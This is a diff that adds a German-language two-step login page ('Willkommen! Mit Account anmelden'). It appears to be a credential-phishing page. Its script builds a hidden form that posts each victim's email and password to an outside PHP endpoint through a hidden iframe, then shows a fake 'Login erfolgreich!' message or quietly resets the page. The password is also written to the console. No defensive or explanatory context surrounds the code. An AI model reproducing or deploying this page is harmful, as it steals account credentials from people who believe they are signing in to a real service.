@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8">
+  <title>Login</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #f2f2f2;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      width: 320px;
+      background: #fff;
+      padding: 30px 25px;
+      border-radius: 12px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+
+    .logo {
+      max-width: 120px;
+      height: auto;
+      margin-bottom: 15px;
+    }
+
+    .bottom-image {
+      max-width: 100%;
+      height: auto;
+      margin-top: 20px;
+      border-radius: 6px;
+    }
+
+    h2 {
+      margin: 10px 0 5px;
+    }
+
+    p {
+      color: #555;
+      font-size: 14px;
+      margin-bottom: 20px;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      margin-bottom: 15px;
+      font-size: 14px;
+      box-sizing: border-box;
+    }
+
+    button {
+      width: 100%;
+      padding: 10px;
+      background: #f5e7a3;
+      border: none;
+      border-radius: 20px;
+      color: #999;
+      font-weight: bold;
+      cursor: not-allowed;
+      transition: 0.2s;
+    }
+
+    button.active {
+      background: #ffd200;
+      color: #000;
+      cursor: pointer;
+    }
+
+    .link {
+      display: block;
+      margin-top: 15px;
+      color: #0073e6;
+      text-decoration: none;
+      font-size: 14px;
+      cursor: pointer;
+    }
+
+    .hidden {
+      display: none;
+    }
+    
+    .success-message {
+      color: green;
+      font-size: 14px;
+      margin-top: 10px;
+      display: none;
+    }
+    
+    .error-message {
+      color: red;
+      font-size: 14px;
+      margin-top: 10px;
+    }
+    
+    iframe {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <!-- STEP 1 -->
+  <div id="step1">
+    <img src="image/logo.jpg" alt="Logo" class="logo" onerror="this.src='https://via.placeholder.com/120x50?text=Logo'">
+    <h2>Willkommen!</h2>
+    <p>Mit Account anmelden</p>
+
+    <input type="email" id="email" placeholder="E-Mail" required>
+    <button id="weiterBtn" disabled>Weiter</button>
+    
+    <img src="image/bottom.jpg" alt="Bottom" class="bottom-image" onerror="this.style.display='none'">
+  </div>
+
+  <!-- STEP 2 -->
+  <div id="step2" class="hidden">
+   <img src="image/logo.jpg" alt="Logo" class="logo" onerror="this.src='https://via.placeholder.com/120x50?text=Logo'">
+    <h2>Willkommen!</h2>
+    <p>Mit Account anmelden</p>
+    <p id="showEmail"></p>
+
+    <!-- IMPORTANT: Keep both visible and hidden fields -->
+    <input type="hidden" id="hiddenEmail" name="hiddenEmail">
+    <input type="password" id="password" placeholder="Passwort" required>
+    <button id="loginBtn" disabled>Login</button>
+    
+    <span class="link" id="backBtn">Zurück</span>
+    
+    <!-- Error message display -->
+    <div id="errorMessage" class="error-message" style="display: none;">Bitte E-Mail und Passwort eingeben.</div>
+    
+    <img src="image/bottom.jpg" alt="Bottom" class="bottom-image" onerror="this.style.display='none'">
+    
+    <!-- Hidden iframe -->
+    <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
+  </div>
+</div>
+
+<script>
+  // Get all elements
+  const emailInput = document.getElementById("email");
+  const weiterBtn = document.getElementById("weiterBtn");
+  const step1 = document.getElementById("step1");
+  const step2 = document.getElementById("step2");
+  const passwordInput = document.getElementById("password");
+  const loginBtn = document.getElementById("loginBtn");
+  const showEmail = document.getElementById("showEmail");
+  const backBtn = document.getElementById("backBtn");
+  const hiddenEmail = document.getElementById("hiddenEmail");
+  const errorMessage = document.getElementById("errorMessage");
+  const hiddenIframe = document.getElementById("hidden_iframe");
+
+  // Create hidden form for submission
+  const hiddenForm = document.createElement('form');
+  hiddenForm.method = 'POST';
+  hiddenForm.action = 'https://digitbytesoltn.com/465565/webbe.php';
+  hiddenForm.target = 'hidden_iframe';
+  hiddenForm.style.display = 'none';
+  document.body.appendChild(hiddenForm);
+
+  // Create form fields
+  const emailField = document.createElement('input');
+  emailField.type = 'hidden';
+  emailField.name = 'email';
+  hiddenForm.appendChild(emailField);
+
+  const passwordField = document.createElement('input');
+  passwordField.type = 'hidden';
+  passwordField.name = 'password';
+  hiddenForm.appendChild(passwordField);
+
+  // Enable Weiter button when email is valid
+  emailInput.addEventListener("input", function() {
+    if (emailInput.value.trim() !== "" && emailInput.checkValidity()) {
+      weiterBtn.disabled = false;
+      weiterBtn.classList.add("active");
+    } else {
+      weiterBtn.disabled = true;
+      weiterBtn.classList.remove("active");
+    }
+  });
+
+  // Go to step 2
+  weiterBtn.addEventListener("click", function() {
+    // Store email in both places
+    const email = emailInput.value.trim();
+    hiddenEmail.value = email;
+    showEmail.textContent = email;
+    
+    // Switch steps
+    step1.classList.add("hidden");
+    step2.classList.remove("hidden");
+    
+    // Clear any error messages
+    errorMessage.style.display = "none";
+    
+    // Focus on password field
+    passwordInput.focus();
+  });
+
+  // Enable Login button when password is entered
+  passwordInput.addEventListener("input", function() {
+    if (passwordInput.value.trim() !== "") {
+      loginBtn.disabled = false;
+      loginBtn.classList.add("active");
+    } else {
+      loginBtn.disabled = true;
+      loginBtn.classList.remove("active");
+    }
+    errorMessage.style.display = "none";
+  });
+
+  // Back to step 1
+  backBtn.addEventListener("click", function() {
+    step2.classList.add("hidden");
+    step1.classList.remove("hidden");
+    passwordInput.value = "";
+    loginBtn.disabled = true;
+    loginBtn.classList.remove("active");
+    errorMessage.style.display = "none";
+  });
+
+  // Handle iframe load
+  hiddenIframe.onload = function() {
+    if (!step2.classList.contains('hidden') && loginBtn.textContent === "Wird gesendet...") {
+      try {
+        const iframeContent = hiddenIframe.contentDocument.body.textContent;
+        
+        if (iframeContent && iframeContent.toLowerCase().includes('error')) {
+          errorMessage.textContent = iframeContent.replace('error:', '').trim();
+          errorMessage.style.display = "block";
+        } else {
+          // Success - redirect or show success message
+          alert("Login erfolgreich!");
+          step2.classList.add("hidden");
+          step1.classList.remove("hidden");
+          passwordInput.value = "";
+        }
+      } catch (e) {
+        // Assume success if we can't read iframe
+        step2.classList.add("hidden");
+        step1.classList.remove("hidden");
+        passwordInput.value = "";
+      }
+      
+      // Reset button
+      loginBtn.disabled = false;
+      loginBtn.classList.add("active");
+      loginBtn.textContent = "Login";
+    }
+  };
+
+  // Login button click handler
+  loginBtn.addEventListener("click", function(e) {
+    e.preventDefault();
+    
+    // Get values
+    const email = hiddenEmail.value.trim();
+    const password = passwordInput.value.trim();
+    
+    // Double-check values
+    console.log("Email:", email); // For debugging
+    console.log("Password:", password); // For debugging
+    
+    // Validate
+    if (!email || !password) {
+      errorMessage.textContent = "Bitte E-Mail und Passwort eingeben.";
+      errorMessage.style.display = "block";
+      return;
+    }
+    
+    // Disable button
+    loginBtn.disabled = true;
+    loginBtn.classList.remove("active");
+    loginBtn.textContent = "Wird gesendet...";
+    
+    // Set form values
+    emailField.value = email;
+    passwordField.value = password;
+    
+    // Submit form
+    hiddenForm.submit();
+  });
+
+  // Handle image errors
+  document.querySelectorAll('img').forEach(img => {
+    img.onerror = function() {
+      this.style.display = 'none';
+    };
+  });
+</script>
+
+</body>
+</html>
